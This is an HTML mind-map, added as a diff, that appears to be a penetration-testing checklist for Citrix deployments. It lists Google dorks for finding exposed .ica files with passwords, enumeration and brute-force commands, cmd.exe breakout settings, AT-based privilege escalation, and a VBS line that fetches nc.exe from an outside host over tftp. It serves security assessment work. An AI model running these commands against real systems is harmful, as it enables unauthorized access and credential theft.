@@ -1,0 +1,509 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Tree</title>
+</head><body><ul><li style="list-style-type: none"></li>
+</ul>
+Sections: Enum, scan, exploit, brute, config, references<ul><li style="list-style-type: none"></li>
+</ul>
+Citrix Specific Testing<ul><li>Citrix provides remote access services to multiple users across a wide range of platforms. The following information I have put together which will hopefully help you conduct a vulnerability assessment/ penetration test against Citrix</li>
+<li>Enumeration</li>
+<li style="list-style-type: none"><ul><li>web search</li>
+<li style="list-style-type: none"><ul><li>Google (GHDB)</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.google.com/search?q=ext:ica">ext:ica</a> <a href="http://www.google.com/search?q=ext:ica"><img src="image.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:citrix/metaframexp/default/login.asp">inurl:citrix/metaframexp/default/login.asp</a> <a href="http://www.google.com/search?q=inurl:citrix/metaframexp/default/login.asp"><img src="image 2.png" /></a></li>
+<li><a href="http://www.google.com/search?q=[WFClient]%20Password=%20filetype:ica">[WFClient] Password= filetype:ica <img src="image 3.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:citrix/metaframexp/default/login.asp?%20ClientDetection=On">inurl:citrix/metaframexp/default/login.asp? ClientDetection=On <img src="image 4.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:metaframexp/default/login.asp%20|%20intitle:%22Metaframe%20XP%20Login%22">inurl:metaframexp/default/login.asp | intitle:"Metaframe XP Login" <img src="image 5.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:/Citrix/Nfuse17/">inurl:/Citrix/Nfuse17/ <img src="image 6.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:Citrix/MetaFrame/default/default.aspx">inurl:Citrix/MetaFrame/default/default.aspx <img src="image 7.png" /></a></li>
+</ul>
+</li>
+<li>Google Hacks (Author Discovered)</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.google.co.uk/#hl=en&q=filetype:ica+Username%3D&start=50&sa=N&fp=1&cad=b">filetype:ica Username=</a> <a href="http://www.google.co.uk/#hl=en&q=filetype:ica+Username%3D&start=50&sa=N&fp=1&cad=b"><img src="image 8.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:Citrix/AccessPlatform/auth/login.aspx">inurl:Citrix/AccessPlatform/auth/login.aspx</a> <a href="http://www.google.com/search?q=inurl:Citrix/AccessPlatform/auth/login.aspx"><img src="image 9.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:/Citrix/AccessPlatform/">inurl:/Citrix/AccessPlatform/</a> <a href="http://www.google.com/search?q=inurl:/Citrix/AccessPlatform/"><img src="image 10.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:LogonAgent/Login.asp">inurl:LogonAgent/Login.asp</a> <a href="http://www.google.com/search?q=inurl:LogonAgent/Login.asp"><img src="image 11.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:inurl:/CITRIX/NFUSE/default/login.asp">inurl:/CITRIX/NFUSE/default/login.asp</a> <a href="http://www.google.com/search?q=inurl:inurl:/CITRIX/NFUSE/default/login.asp"><img src="image 12.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:/Citrix/NFuse161/login.asp">inurl:/Citrix/NFuse161/login.asp</a> <a href="http://www.google.com/search?q=inurl:/Citrix/NFuse161/login.asp"><img src="image 13.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:/Citrix/NFuse16/">inurl:/Citrix/NFuse16</a> <a href="http://www.google.com/search?q=inurl:/Citrix/NFuse16/"><img src="image 14.png" /></a></li>
+<li><a href="http://www.google.com/search?q=inurl:/Citrix/NFuse151/%20">inurl:/Citrix/NFuse151/</a> <a href="http://www.google.com/search?q=inurl:/Citrix/NFuse151/%20"><img src="image 15.png" /></a></li>
+<li><a href="http://www.google.com/search?q=allintitle:MetaFrame%20XP%20Login">allintitle:MetaFrame XP Login</a> <a href="http://www.google.com/search?q=allintitle:MetaFrame%20XP%20Login"><img src="image 16.png" /></a></li>
+<li><a href="http://www.google.com/search?q=allintitle:MetaFrame%20Presentation%20Server%20Login">allintitle:MetaFrame Presentation Server Login</a> <a href="http://www.google.com/search?q=allintitle:MetaFrame%20Presentation%20Server%20Login"><img src="image 17.png" /></a></li>
+<li>inurl:Citrix/~bespoke_company_name~/default/login.aspx?ClientDetection=On</li>
+<li><a href="http://www.google.com/search?q=allintitle:Citrix(R)%20NFuse(TM)%20Classic%20Login">allintitle:Citrix(R) NFuse(TM) Classic Login</a> <a href="http://www.google.com/search?q=allintitle:Citrix(R)%20NFuse(TM)%20Classic%20Login"><img src="image 18.png" /></a></li>
+<li style="list-style-type: none"><ul><li>allintitle:Citrix(R) NFuse(TM)</li>
+<li>allintitle:Citrix(r) NFuse(tm) 1.6</li>
+<li>allintitle:Citrix(R) NFuse(TM) Options</li>
+<li>allintitle:Citrix(R) NFuse(TM) Innlogging</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Yahoo</li>
+<li style="list-style-type: none"><ul><li><a href="http://search.yahoo.com/search?p=originurlextension:ica">originurlextension:ica</a> <a href="http://search.yahoo.com/search?p=originurlextension:ica"><img src="image 19.png" /></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>site search</li>
+<li style="list-style-type: none"><ul><li>Manual</li>
+<li style="list-style-type: none"><ul><li>review web page for useful information</li>
+<li>review source for web page</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>generic</li>
+<li style="list-style-type: none"><ul><li>nmap -A -PN -p 80,443,1494 ip_address</li>
+<li>amap -bqv ip_address port_no.</li>
+</ul>
+</li>
+<li>citrix specific</li>
+<li style="list-style-type: none"><ul><li><a href="http://gobag.googlecode.com/svn/trunk/citrix/enum.pl">enum.pl</a> <a href="http://gobag.googlecode.com/svn/trunk/citrix/enum.pl"><img src="image 20.png" /></a></li>
+<li style="list-style-type: none"><ul><li>perl enum.pl ip_address</li>
+</ul>
+</li>
+<li><a href="http://www.gnucitizen.org/static/blog/2007/10/enum.js">enum.js</a> <a href="http://www.gnucitizen.org/static/blog/2007/10/enum.js"><img src="image 21.png" /></a></li>
+<li style="list-style-type: none"><ul><li>enum.js apps TCPBrowserAdress=ip_address</li>
+</ul>
+</li>
+<li><a href="http://www.gnucitizen.org/blog/hacking-citrix-the-forceful-way/">connect.js</a> <a href="http://www.gnucitizen.org/blog/hacking-citrix-the-forceful-way/"><img src="image 22.png" /></a></li>
+<li style="list-style-type: none"><ul><li>connect.js TCPBrowserAdress=ip_address Application=advertised-application</li>
+</ul>
+</li>
+<li><a href="http://www.securiteam.com/exploits/5CP0B1F80S.html">Citrix-pa-scan</a> <a href="http://www.securiteam.com/exploits/5CP0B1F80S.html"><img src="image 23.png" /></a></li>
+<li style="list-style-type: none"><ul><li>perl pa-scan.pl ip_address [timeout] &gt; pas.wri</li>
+</ul>
+</li>
+<li><a href="http://sh0dan.org/oldfiles/citrix-pab/">pabrute.c</a> <a href="http://sh0dan.org/oldfiles/citrix-pab/"><img src="image 24.png" /></a></li>
+<li style="list-style-type: none"><ul><li>./pabrute pubapp list app_list ip_address</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Default Ports</li>
+<li style="list-style-type: none"><ul><li>TCP</li>
+<li style="list-style-type: none"><ul><li>Citrix XML Service</li>
+<li style="list-style-type: none"><ul><li>80</li>
+</ul>
+</li>
+<li>Advanced Management Console</li>
+<li style="list-style-type: none"><ul><li>135</li>
+</ul>
+</li>
+<li>Citrix SSL Relay</li>
+<li style="list-style-type: none"><ul><li>443</li>
+</ul>
+</li>
+<li>ICA sessions</li>
+<li style="list-style-type: none"><ul><li>1494</li>
+</ul>
+</li>
+<li>Server to server</li>
+<li style="list-style-type: none"><ul><li>2512</li>
+</ul>
+</li>
+<li>Management Console to server</li>
+<li style="list-style-type: none"><ul><li>2513</li>
+</ul>
+</li>
+<li>Session Reliability (Auto-reconnect)</li>
+<li style="list-style-type: none"><ul><li>2598</li>
+<li>Note: - If 1494 is open, this would not normally be seen</li>
+</ul>
+</li>
+<li>License Management Console</li>
+<li style="list-style-type: none"><ul><li>8082</li>
+</ul>
+</li>
+<li>License server</li>
+<li style="list-style-type: none"><ul><li>27000</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>UDP</li>
+<li style="list-style-type: none"><ul><li>Clients to ICA browser service</li>
+<li style="list-style-type: none"><ul><li>1604</li>
+</ul>
+</li>
+<li>Server-to-server</li>
+<li style="list-style-type: none"><ul><li>1604</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://nmap.org/">nmap nse scripts</a> <a href="http://nmap.org/"><img src="image 25.png" /></a></li>
+<li style="list-style-type: none"><ul><li><a href="http://nmap.org/nsedoc/scripts/citrix-enum-apps.html">citrix-enum-apps</a> <a href="http://nmap.org/nsedoc/scripts/citrix-enum-apps.html"><img src="image 26.png" /></a></li>
+<li style="list-style-type: none"><ul><li>nmap -sU --script=citrix-enum-apps -p 1604 &lt;host&gt;</li>
+</ul>
+</li>
+<li><a href="http://nmap.org/nsedoc/scripts/citrix-enum-apps-xml.html">citrix-enum-apps-xml</a> <a href="http://nmap.org/nsedoc/scripts/citrix-enum-apps-xml.html"><img src="image 27.png" /></a></li>
+<li style="list-style-type: none"><ul><li>nmap --script=citrix-enum-apps-xml -p 80,443 &lt;host&gt;</li>
+</ul>
+</li>
+<li><a href="http://nmap.org/nsedoc/scripts/citrix-enum-servers.html">citrix-enum-servers</a> <a href="http://nmap.org/nsedoc/scripts/citrix-enum-servers.html"><img src="image 28.png" /></a></li>
+<li style="list-style-type: none"><ul><li>nmap -sU --script=citrix-enum-servers -p 1604</li>
+</ul>
+</li>
+<li><a href="http://nmap.org/nsedoc/scripts/citrix-enum-servers-xml.html">citrix-enum-servers-xml</a> <a href="http://nmap.org/nsedoc/scripts/citrix-enum-servers-xml.html"><img src="image 29.png" /></a></li>
+<li style="list-style-type: none"><ul><li>nmap --script=citrix-enum-servers-xml -p 80,443 &lt;host&gt;</li>
+</ul>
+</li>
+<li><a href="http://nmap.org/nsedoc/scripts/citrix-brute-xml.html">citrix-brute-xml</a> <a href="http://nmap.org/nsedoc/scripts/citrix-brute-xml.html"><img src="image 30.png" /></a></li>
+<li style="list-style-type: none"><ul><li>nmap --script=citrix-brute-xml --script-args=userdb=&lt;userdb&gt;,passdb=&lt;passdb&gt;,ntdomain=&lt;domain&gt; -p 80,443 &lt;host&gt;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Scanning</li>
+<li style="list-style-type: none"><ul><li><a href="http://nessus.org/">Nessus</a> <a href="http://nessus.org/"><img src="image 31.png" /></a></li>
+<li style="list-style-type: none"><ul><li><a href="http://www.nessus.org/plugins/index.php?view=search">Plugins</a> <a href="http://www.nessus.org/plugins/index.php?view=search"><img src="image 32.png" /></a></li>
+<li style="list-style-type: none"><ul><li>CGI abuses</li>
+<li style="list-style-type: none"><ul><li>NetScaler web management interface ip address cookie disclosure</li>
+</ul>
+</li>
+<li>CGI abuses : Cross Site Scripting (XSS)</li>
+<li style="list-style-type: none"><ul><li>Citrix MetaFrame XP login.asp</li>
+<li>Citrix NFuse Launch Scripts</li>
+<li>NetScaler web management XSS</li>
+</ul>
+</li>
+<li>Misc.</li>
+<li style="list-style-type: none"><ul><li>Citrix Published Applications Remote Enumeration</li>
+<li>NetScaler web management cookie information</li>
+</ul>
+</li>
+<li>Service Detection</li>
+<li style="list-style-type: none"><ul><li>Citrix Licensing Server detection</li>
+<li>Citrix Server detection</li>
+</ul>
+</li>
+<li>Web Servers</li>
+<li style="list-style-type: none"><ul><li>Citrix NFuse Server launch.asp Arbitrary Server/ Port Redirect</li>
+<li>NetScaler web management cookie cipher weakness</li>
+<li>NetScaler web management interface detection</li>
+<li>Unencrypted NetScaler web management interface</li>
+</ul>
+</li>
+<li>Windows</li>
+<li style="list-style-type: none"><ul><li>Citrix Licensing Server License Management Console</li>
+<li>Citrix Password Manager Agent Secondary Credential Information Disclosurey</li>
+<li>Citrix Password Manager Service Stored Credentials Disclosure</li>
+<li>Citrix Presentation Server Remote Code Execution</li>
+<li>Citrix Presentation Server Client Program Neighbourhood Agent (PNAgent) Denial of Service</li>
+<li>Citrix web interface 4.6, 5.0, 5.0.1 XSS</li>
+<li>Novell Client TS/ Citrix Session Arbitrary User Profile Invocation</li>
+<li>NetScaler web management cookie cipher weakness</li>
+<li>NetScaler web management interface detection</li>
+<li>NetScaler web management login</li>
+<li>Unencrypted NetScaler web management interface</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://www.cirt.net/">Nikto</a> <a href="http://www.cirt.net/"><img src="image 33.png" /></a></li>
+<li style="list-style-type: none"><ul><li>perl nikto.pl -host ip_address -port port_no.</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>Note: - It is possible to grep all Citrix/ NFuse/ NetScaler vulnerabilities currently housed in the nikto db and create your own db_tests file replacing the local version in nikto\plugins directory should you wish to specifically limit your enumeration to Citrix vulnerabilties. As of 1 Oct 09, there are currently 9 specific tests meeting these requirements.</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Exploitation</li>
+<li style="list-style-type: none"><ul><li>Alter default .ica files</li>
+<li style="list-style-type: none"><ul><li>InitialProgram=cmd.exe</li>
+<li>InitialProgram=c:\windows\system32\cmd.exe</li>
+<li>InitialProgram=explorer.exe</li>
+</ul>
+</li>
+<li>Enumerate and Connect</li>
+<li style="list-style-type: none"><ul><li>For applications identified by Citrix-pa-scan</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.securiteam.com/exploits/5CP0B1F80S.html">Pas</a> <a href="http://www.securiteam.com/exploits/5CP0B1F80S.html"><img src="image 34.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Requires pas.wri to be present in the same directory (obtained from the output using Citrix-pa-scan)</li>
+<li>Writes output to pas_results.wri</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>For published applications with a Citrix client when the master browser is non-public.</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.securiteam.com/exploits/5CP0B1F80S.html">Citrix-pa-proxy</a> <a href="http://www.securiteam.com/exploits/5CP0B1F80S.html"><img src="image 35.png" /></a></li>
+<li style="list-style-type: none"><ul><li>pa-proxy.pl IP_to_proxy_to (i.e. remote server) 127.0.0.1</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Manual Testing</li>
+<li style="list-style-type: none"><ul><li>Create Batch File (cmd.bat)</li>
+<li style="list-style-type: none"><ul><li>1</li>
+<li style="list-style-type: none"><ul><li>cmd.exe</li>
+</ul>
+</li>
+<li>2</li>
+<li style="list-style-type: none"><ul><li>echo off</li>
+<li>command</li>
+<li>echo on</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://www.computerperformance.co.uk/ezine/ezine80.htm">Host Scripting File (cmd.vbs) <img src="image 36.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Option Explicit</li>
+<li>Dim objShell</li>
+<li>Set objShell = CreateObject("WScript.Shell")</li>
+<li>objShell.Run "%comspec% /k"</li>
+<li>WScript.Quit</li>
+<li>alternative functionality</li>
+<li style="list-style-type: none"><ul><li>objShell.Run "%comspec% /k c: &amp; dir"</li>
+<li>objShell.Run "%comspec% /k c: &amp; cd temp &amp; dir &gt;temp.txt &amp; notepad temp.txt"</li>
+<li>objShell.Run "%comspec% /k c: &amp; tftp -i ip_address GET nc.exe" :-)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://ikat.ha.cked.net/">iKat</a> <a href="http://ikat.ha.cked.net/"><img src="image 37.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Integrated Kiosk Attack Tool</li>
+<li style="list-style-type: none"><ul><li>Reconnaissance</li>
+<li>FileSystem Links</li>
+<li>Common Dialogs</li>
+<li>Application Handlers</li>
+<li>Browser Plugins</li>
+<li>iKAT Tools</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>AT Command - priviledge escalation</li>
+<li style="list-style-type: none"><ul><li>AT HH:MM /interactive "cmd.exe"</li>
+<li>AT HH:MM /interactive %comspec% /k</li>
+<li></li>
+<li>Note: - AT by default runs as system and although enabled for a normal user, will only work with these privileges for an admin, however, still worth a try.</li>
+<li></li>
+</ul>
+</li>
+<li>Keyboard Shortcuts/ Hotkeys</li>
+<li style="list-style-type: none"><ul><li>Ctrl + h – View History</li>
+<li>Ctrl + n – New Browser</li>
+<li>Shift + Left Click – New Browser</li>
+<li>Ctrl + o – Internet Address (browse feature)</li>
+<li>Ctrl + p – Print (to file)</li>
+<li>Right Click (Shift + F10)</li>
+<li style="list-style-type: none"><ul><li>Save Image As</li>
+<li>View Source</li>
+</ul>
+</li>
+<li>F1 – Jump to URL</li>
+<li>SHIFT+F1: Local Task List</li>
+<li>SHIFT+F2: Toggle Title Bar</li>
+<li>SHIFT+F3: Close Remote Application</li>
+<li>CTRL+F1: Displays Windows Security Desktop – Ctrl+Alt+Del</li>
+<li>CTRL+F2: Remote Task List</li>
+<li>CTRL+F3: Remote Task Manager – Ctrl+Shift+ESC</li>
+<li>ALT+F2: Cycle through programs</li>
+<li>ALT+PLUS: Alt+TAB</li>
+<li>ALT+MINUS: ALT+SHIFT+TAB</li>
+</ul>
+</li>
+<li><a href="http://code.google.com/p/netscaler-cookie-decryptor/">netscaler-cookie-decryptor</a> <a href="http://code.google.com/p/netscaler-cookie-decryptor/"><img src="image 38.png" /></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Brute Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.gnucitizen.org/static/blog/2007/10/bforce.js">bforce.js</a> <a href="http://www.gnucitizen.org/static/blog/2007/10/bforce.js"><img src="image 39.png" /></a></li>
+<li style="list-style-type: none"><ul><li>bforce.js TCPBrowserAddress=ip_address usernames=user1,user2 passwords=pass1,pass2</li>
+<li>bforce.js HTTPBrowserAddress=ip_address userfile=file.txt passfile=file.txt</li>
+<li></li>
+<li>bforce.js TCPBrowserAddress=ip-address usernames=user1,user2 passwords=pass1,pass2 timeout=5000</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Review Configuration Files</li>
+<li style="list-style-type: none"><ul><li>Application server configuration file</li>
+<li style="list-style-type: none"><ul><li>appsrv.ini</li>
+<li style="list-style-type: none"><ul><li>Location</li>
+<li style="list-style-type: none"><ul><li>&lt;profile path&gt;\Application Data\ICAClient</li>
+<li>/usr/lib/ICAClient/config/appsrv.ini</li>
+<li>$HOME/.ICAClient/appsrv.ini</li>
+<li>Other ...</li>
+</ul>
+</li>
+<li>World writeable</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.securiteam.com/windowsntfocus/6G00L15BPC.html">Citrix Server Allows Key Logging Functionality</a> <a href="http://www.securiteam.com/windowsntfocus/6G00L15BPC.html"><img src="image 40.png" /></a></li>
+<li style="list-style-type: none"><ul><li><a href="http://www.hoffmannbv.nl/html/hoffmann/document_download.cfm?doc=ED3630EA-423B-10FA-8350E2C2B46F1E57.PDF&doc_name=Analysis:%20Citrix%20Keyboard%20Logger">scancodes.pl</a> <a href="http://www.hoffmannbv.nl/html/hoffmann/document_download.cfm?doc=ED3630EA-423B-10FA-8350E2C2B46F1E57.PDF&doc_name=Analysis:%20Citrix%20Keyboard%20Logger"><img src="image 41.png" /></a></li>
+<li style="list-style-type: none"><ul><li>perl scancodes.pl wfcwin32.log</li>
+</ul>
+</li>
+<li>LogKeyboard=On</li>
+<li>LogAppend=On</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Review other files</li>
+<li style="list-style-type: none"><ul><li>wfcwin32.log</li>
+<li style="list-style-type: none"><ul><li>&lt;profile path&gt;\Application Data\ICAClient</li>
+<li>Other ...</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://support.citrix.com/article/CTX331178">Sample file</a> <a href="http://support.citrix.com/article/CTX331178"><img src="image 42.png" /></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Program Neighborhood configuration file</li>
+<li style="list-style-type: none"><ul><li>pn.ini</li>
+<li style="list-style-type: none"><ul><li>Location</li>
+<li style="list-style-type: none"><ul><li>&lt;profile path&gt;\Application Data\ICAClient</li>
+<li>/usr/lib/ICAClient/config/pn.ini</li>
+<li>Other ...</li>
+</ul>
+</li>
+<li>Review other files</li>
+<li style="list-style-type: none"><ul><li>.idx files</li>
+<li style="list-style-type: none"><ul><li>Mini-database containing published apps available</li>
+</ul>
+</li>
+<li>.vl files</li>
+<li style="list-style-type: none"><ul><li>The encrypted username, password, and domain name</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://support.citrix.com/article/CTX145271">Sample file</a> <a href="http://support.citrix.com/article/CTX145271"><img src="image 43.png" /></a></li>
+<li>Weak Encryption enabled?</li>
+<li style="list-style-type: none"><ul><li><a href="http://support.citrix.com/article/CTX155541">http://support.citrix.com/article/CTX155541</a> <a href="http://support.citrix.com/article/CTX155541"><img src="image 44.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Thanks to Paweł Krawczyk</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html#FMFreemind_Link_396088639FM"><img src="image 45.png" /></a></li>
+</ul>
+</li>
+<li>Citrix ICA client configuration file</li>
+<li style="list-style-type: none"><ul><li>wfclient.ini</li>
+<li style="list-style-type: none"><ul><li>Location</li>
+<li style="list-style-type: none"><ul><li>&lt;profile path&gt;\Application Data\ICAClient</li>
+<li>/usr/lib/ICAClient/config/wfclient. ini</li>
+<li>$HOME/.ICAClient/wfclient.ini</li>
+<li>Other ...</li>
+</ul>
+</li>
+<li><a href="http://dv-zeuthen.desy.de/e7/e756/e915/index_eng.html">Sample file</a> <a href="http://dv-zeuthen.desy.de/e7/e756/e915/index_eng.html"><img src="image 46.png" /></a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>References</li>
+<li style="list-style-type: none"><ul><li>Vulnerabilities</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.artofhacking.com/tucops/hack/citrix/index.htm">Art of Hacking</a> <a href="http://www.artofhacking.com/tucops/hack/citrix/index.htm"><img src="image 47.png" /></a></li>
+<li>Common Vulnerabilities and Exploits (CVE)</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>Vulnerabilties and exploit information relating to these products can be found here:</li>
+<li></li>
+<li><a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=citrix">http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=citrix</a> <a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=citrix"><img src="image 48.png" /></a></li>
+</ul>
+</li>
+<li>OSVDB</li>
+<li style="list-style-type: none"><ul><li><a href="http://osvdb.org/search/search?search[vuln_title]=Citrix&search[text_type]=titles&search[s_date]=&search[e_date]=&search[refid]=&search[referencetypes]=&search[vendors]=&kthx=searchSecunia">http://osvdb.org/search/search?search[vuln_title]=Citrix&amp;search[text_type]=titles&amp;search[s_date]=&amp;search[e_date]=&amp;search[refid]=&amp;search[referencetypes]=&amp;search[vendors]=&amp;kthx=searchSecunia<img src="image 49.png" /></a></li>
+</ul>
+</li>
+<li>Secunia</li>
+<li style="list-style-type: none"><ul><li><a href="http://secunia.com/advisories/search/?search=citrix">http://secunia.com/advisories/search/?search=citrix</a> <a href="http://secunia.com/advisories/search/?search=citrix"><img src="image 50.png" /></a></li>
+</ul>
+</li>
+<li>Security-database.com</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.security-database.com/cgi-bin/search-sd.cgi?q=Citrix">http://www.security-database.com/cgi-bin/search-sd.cgi?q=Citrix</a> <a href="http://www.security-database.com/cgi-bin/search-sd.cgi?q=Citrix"><img src="image 51.png" /></a></li>
+</ul>
+</li>
+<li><a href="http://www.securityfocus.com/vulnerabilities">SecurityFocus</a> <a href="http://www.securityfocus.com/vulnerabilities"><img src="image 52.png" /></a></li>
+</ul>
+</li>
+<li>Support</li>
+<li style="list-style-type: none"><ul><li>Citrix</li>
+<li style="list-style-type: none"><ul><li><a href="http://support.citrix.com/">Knowledge Base</a> <a href="http://support.citrix.com/"><img src="image 53.png" /></a></li>
+<li><a href="http://forums.citrix.com/support">Forum</a> <a href="http://forums.citrix.com/support"><img src="image 54.png" /></a></li>
+</ul>
+</li>
+<li><a href="http://www.thin-world.com/nfuse.htm">Thinworld</a> <a href="http://www.thin-world.com/nfuse.htm"><img src="image 55.png" /></a></li>
+</ul>
+</li>
+<li>Exploits</li>
+<li style="list-style-type: none"><ul><li>Milw0rm</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.milw0rm.com/search.php">http://www.milw0rm.com/search.php</a> <a href="http://www.milw0rm.com/search.php"><img src="image 56.png" /></a></li>
+</ul>
+</li>
+<li>Art of Hacking</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.artofhacking.com/tucops/hack/citrix/index.htm">Citrix</a> <a href="http://www.artofhacking.com/tucops/hack/citrix/index.htm"><img src="image 57.png" /></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Tutorials/ Presentations</li>
+<li style="list-style-type: none"><ul><li>Carnal0wnage</li>
+<li style="list-style-type: none"><ul><li><a href="http://carnal0wnage.blogspot.com/2007/11/over-on-gnucitizen-blog-if-you-dont.html">Carnal0wnage Blog: Citrix Hacking</a> <a href="http://carnal0wnage.blogspot.com/2007/11/over-on-gnucitizen-blog-if-you-dont.html"><img src="image 58.png" /></a></li>
+</ul>
+</li>
+<li>Foundstone</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.foundstone.com/us/resources/whitepapers/Got%20Citrix%20Hack%20IT.pdf%20">Got Citrix, Hack IT</a> <a href="http://www.foundstone.com/us/resources/whitepapers/Got%20Citrix%20Hack%20IT.pdf%20"><img src="image 59.png" /></a></li>
+</ul>
+</li>
+<li>GNUCitizen</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.gnucitizen.org/blog/hacking-citrix-the-forceful-way/">Hacking CITRIX - the forceful way</a> <a href="http://www.gnucitizen.org/blog/hacking-citrix-the-forceful-way/"><img src="image 60.png" /></a></li>
+<li><a href="http://www.gnucitizen.org/blog/0day-hacking-secured-citrix-from-outside/">0day: Hacking secured CITRIX from outside</a> <a href="http://www.gnucitizen.org/blog/0day-hacking-secured-citrix-from-outside/"><img src="image 61.png" /></a></li>
+<li><a href="http://www.gnucitizen.org/blog/citrix-owning-the-legitimate-backdoor/">CITRIX: Owning the Legitimate Backdoor</a> <a href="http://www.gnucitizen.org/blog/citrix-owning-the-legitimate-backdoor/"><img src="image 62.png" /></a></li>
+<li><a href="http://www.gnucitizen.org/blog/remote-desktop-command-fixation-attacks/">Remote Desktop Command Fixation Attacks</a> <a href="http://www.gnucitizen.org/blog/remote-desktop-command-fixation-attacks/"><img src="image 63.png" /></a></li>
+</ul>
+</li>
+<li>Packetstormsecurity</li>
+<li style="list-style-type: none"><ul><li><a href="http://packetstormsecurity.org/0210-exploits/hackingcitrix.txt">Hacking Citrix</a> <a href="http://packetstormsecurity.org/0210-exploits/hackingcitrix.txt"><img src="image 64.png" /></a></li>
+</ul>
+</li>
+<li>Insomniac Security</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.insomniasec.com/publications/Hacking_Citrix.ppt">Hacking Citrix</a> <a href="http://www.insomniasec.com/publications/Hacking_Citrix.ppt"><img src="image 65.png" /></a></li>
+</ul>
+</li>
+<li>Aditya Sood</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.secniche.org/talks/xfocus_xcon_2008_aks_oknock.pdf">Rolling Balls - Can you hack clients</a> <a href="http://www.secniche.org/talks/xfocus_xcon_2008_aks_oknock.pdf"><img src="image 66.png" /></a></li>
+</ul>
+</li>
+<li>BlackHat</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.blackhat.com/presentations/bh-europe-08/Petkov/Presentation/bh-eu-08-petkov.pdf">Client Side Security <img src="image 67.png" /></a></li>
+</ul>
+</li>
+<li>itgeekchronicles</li>
+<li style="list-style-type: none"><ul><li><a href="http://itgeekchronicles.co.uk/category/netscaler/">Netscaler: Making sense of the Cookie</a> <a href="http://itgeekchronicles.co.uk/category/netscaler/"><img src="image 68.png" /></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/citrix_tools.zip">Tools Resource</a> <a href="http://www.vulnerabilityassessment.co.uk/citrix_tools.zip"><img src="image 69.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Zip file containing the majority of tools mentioned in this article into a zip file for easy download/ access</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+&nbsp; </body></html>
